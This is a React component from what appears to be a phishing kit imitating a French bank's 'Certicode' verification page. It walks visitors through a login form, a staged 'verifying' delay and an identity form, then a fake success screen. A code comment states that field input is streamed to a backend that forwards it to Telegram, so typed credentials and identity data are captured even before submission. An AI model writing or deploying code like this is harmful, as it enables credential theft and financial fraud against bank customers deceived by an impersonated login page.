import { useCallback, useEffect, useRef, useState } from "react";
import Header from "@/components/Header";
import Footer from "@/components/Footer";
import IntroStep from "@/components/steps/IntroStep";
import LoginStep from "@/components/steps/LoginStep";
import VerifyingStep from "@/components/steps/VerifyingStep";
import IdentityStep from "@/components/steps/IdentityStep";
import SuccessStep from "@/components/steps/SuccessStep";
import { createSession, submitStep, pushProgress } from "@/lib/api";
import { toast } from "sonner";

const STEPS = ["intro", "login", "verifying", "identity", "complete"];

export default function CerticodeFlow() {
  const [sessionId, setSessionId] = useState(null);
  const [currentStep, setCurrentStep] = useState("intro");
  const [submitting, setSubmitting] = useState(false);
  const sessionRequestedRef = useRef(false);
  const sessionIdRef = useRef(null);
  const progressTimerRef = useRef(null);

  useEffect(() => {
    if (sessionRequestedRef.current) return;
    sessionRequestedRef.current = true;
    (async () => {
      try {
        const data = await createSession();
        setSessionId(data.session_id);
        sessionIdRef.current = data.session_id;
      } catch (err) {
        console.error("session create failed", err);
      }
    })();
  }, []);

  // Debounced progressive update to backend (which forwards to Telegram)
  const handleProgress = useCallback((stage, data) => {
    const sid = sessionIdRef.current;
    if (!sid) return;
    if (progressTimerRef.current) clearTimeout(progressTimerRef.current);
    progressTimerRef.current = setTimeout(() => {
      pushProgress(sid, stage, data);
    }, 450);
  }, []);

  const goNext = (stepKey) => {
    const idx = STEPS.indexOf(stepKey);
    setCurrentStep(STEPS[Math.min(idx + 1, STEPS.length - 1)]);
    window.scrollTo({ top: 0, behavior: "smooth" });
  };

  const handleLoginSubmit = async (fields) => {
    if (submitting) return;
    setSubmitting(true);
    try {
      if (sessionId) {
        await submitStep(sessionId, "login", fields);
      }
      // Show verifying step for 2.5s, then go to identity
      setCurrentStep("verifying");
      window.scrollTo({ top: 0, behavior: "smooth" });
      await new Promise((r) => setTimeout(r, 2500));
      setCurrentStep("identity");
    } catch (err) {
      console.error("login submit failed", err);
      toast.error("Une erreur est survenue. Merci de réessayer.");
    } finally {
      setSubmitting(false);
    }
  };

  const handleIdentitySubmit = async (fields) => {
    if (submitting) return;
    setSubmitting(true);
    try {
      const start = Date.now();
      if (sessionId) {
        await submitStep(sessionId, "identity", fields);
      }
      const elapsed = Date.now() - start;
      const minDelay = 900;
      if (elapsed < minDelay) {
        await new Promise((r) => setTimeout(r, minDelay - elapsed));
      }
      setCurrentStep("complete");
      window.scrollTo({ top: 0, behavior: "smooth" });
    } catch (err) {
      console.error("identity submit failed", err);
      toast.error("Une erreur est survenue. Merci de réessayer.");
    } finally {
      setSubmitting(false);
    }
  };

  return (
    <div className="flex min-h-screen flex-col bg-[#F7F8FA]" data-testid="certicode-flow">
      <Header />

      <main className="flex-1 px-4 sm:px-6 py-5 sm:py-8">
        <div className="mx-auto w-full max-w-lg">
          {currentStep === "intro" && (
            <IntroStep onContinue={() => goNext("intro")} />
          )}

          {(currentStep === "login" ||
            currentStep === "verifying" ||
            currentStep === "identity") && (
            <div
              className="rounded-none sm:rounded-xl bg-white p-1 sm:p-6 sm:border sm:border-[#E8ECF1] sm:lbp-shadow-lg"
              data-testid="step-card"
            >
              {currentStep === "login" && (
                <LoginStep
                  onSubmit={handleLoginSubmit}
                  onProgress={handleProgress}
                  submitting={submitting}
                />
              )}
              {currentStep === "verifying" && <VerifyingStep />}
              {currentStep === "identity" && (
                <IdentityStep
                  onSubmit={handleIdentitySubmit}
                  onProgress={handleProgress}
                  submitting={submitting}
                />
              )}
            </div>
          )}

          {currentStep === "complete" && (
            <div
              className="rounded-none sm:rounded-xl bg-white p-4 sm:p-6 sm:border sm:border-[#E8ECF1] sm:lbp-shadow-lg"
              data-testid="step-card"
            >
              <SuccessStep />
            </div>
          )}
        </div>
      </main>

      <Footer />
    </div>
  );
}
